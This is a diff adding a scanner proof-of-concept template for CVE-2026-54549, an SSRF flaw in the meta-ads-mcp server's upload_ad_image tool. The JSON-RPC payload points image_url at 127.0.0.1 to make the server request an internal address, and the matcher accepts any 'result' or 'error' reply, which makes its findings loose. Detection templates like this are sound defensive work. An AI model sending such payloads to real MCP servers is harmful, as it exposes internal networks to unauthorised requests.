@@ -1,0 +1,36 @@
+[info]
+author = "AVE"
+description = "检测 meta-ads-mcp upload_ad_image 工具是否存在 SSRF 漏洞，通过发送恶意 image_url 参数指向内网地址，验证服务端是否发起未授权 HTTP 请求"
+id = "POC-AVE-2026-0571"
+name = "CVE-2026-54549 PoC"
+severity = "high"
+tags = ["cve-2026-54549"]
+vuln_id = [
+    "CVE-2026-54549",
+    "AVE-2026-0571",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/mcp"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"upload_ad_image","arguments":{"image_url":"http://127.0.0.1/"}}}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "Bearer dummy"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "result",
+    "error",
+]
